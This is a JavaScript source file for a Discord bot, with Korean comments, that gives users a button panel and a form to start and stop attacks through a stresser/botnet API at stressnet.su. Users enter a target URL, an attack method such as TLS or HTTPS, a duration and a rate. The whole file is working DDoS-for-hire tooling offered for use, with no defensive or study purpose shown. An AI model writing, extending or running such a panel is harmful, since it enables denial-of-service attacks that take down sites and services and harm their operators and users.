// src/panel.js
import {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  InteractionType,
} from "discord.js";
import fetch from "node-fetch";

const API_KEY = process.env.BOTNET_API_KEY;
const BASE_URL = "https://stressnet.su/api/attack";

export function setupPanel(client) {
  console.log("🛠️ setupPanel 실행됨");

  // !패널 → 버튼 패널 생성
  client.on("messageCreate", async (message) => {
    if (message.author.bot) return;

    if (message.content === "!패널") {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId("start").setLabel("Start Attack").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId("stop").setLabel("Stop Attack").setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId("stopall").setLabel("Stop All").setStyle(ButtonStyle.Secondary),
      );

      await message.channel.send({ content: "⚙️ Control Panel", components: [row] });
    }
  });

  // 버튼 눌렀을 때
  client.on("interactionCreate", async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === "start") {
      const modal = new ModalBuilder().setCustomId("attackModal").setTitle("Start Attack");

      const target = new TextInputBuilder()
        .setCustomId("target")
        .setLabel("Target (예: http://example.org)")
        .setStyle(TextInputStyle.Short)
        .setRequired(true);

      const method = new TextInputBuilder()
        .setCustomId("method")
        .setLabel("Method (TLS/HTTPS/MIX/VSE/QUANTUM/...)")
        .setStyle(TextInputStyle.Short)
        .setRequired(true);

      const time = new TextInputBuilder()
        .setCustomId("time")
        .setLabel("Time (min. 60)")
        .setStyle(TextInputStyle.Short)
        .setPlaceholder("120")
        .setRequired(true);

      const rate = new TextInputBuilder()
        .setCustomId("rate")
        .setLabel("Rate (1–32)")
        .setStyle(TextInputStyle.Short)
        .setPlaceholder("32")
        .setRequired(true);

      modal.addComponents(
        new ActionRowBuilder().addComponents(target),
        new ActionRowBuilder().addComponents(method),
        new ActionRowBuilder().addComponents(time),
        new ActionRowBuilder().addComponents(rate),
      );

      await interaction.showModal(modal);
    }

    if (interaction.customId === "stop") {
      const url = `${BASE_URL}/stop/${API_KEY}/?uuid=YOUR_ATTACK_ID`;
      const res = await fetch(url);
      const data = await res.text();

      await interaction.reply({ content: `🛑 Stop Attack\n\`\`\`${data}\`\`\``, ephemeral: true });
    }

    if (interaction.customId === "stopall") {
      const url = `${BASE_URL}/stop-all/${API_KEY}`;
      const res = await fetch(url);
      const data = await res.text();

      await interaction.reply({ content: `🛑 Stop All Attacks\n\`\`\`${data}\`\`\``, ephemeral: true });
    }
  });

  // 모달 제출
  client.on("interactionCreate", async (interaction) => {
    if (interaction.type !== InteractionType.ModalSubmit) return;
    if (interaction.customId === "attackModal") {
      const target = interaction.fields.getTextInputValue("target");
      const method = interaction.fields.getTextInputValue("method");
      const time = interaction.fields.getTextInputValue("time");
      const rate = interaction.fields.getTextInputValue("rate");

      const url = `${BASE_URL}/start/${API_KEY}/?target=${encodeURIComponent(target)}&time=${time}&method=${method}&rate=${rate}`;
      const res = await fetch(url);
      const data = await res.text();

      await interaction.reply({
        content:
          `📡 Start Attack 요청됨\n\n` +
          `Target: ${target}\n` +
          `Method: ${method}\n` +
          `Time: ${time}\n` +
          `Rate: ${rate}\n\n` +
          `응답:\n\`\`\`${data}\`\`\``,
        ephemeral: true,
      });
    }
  });
}
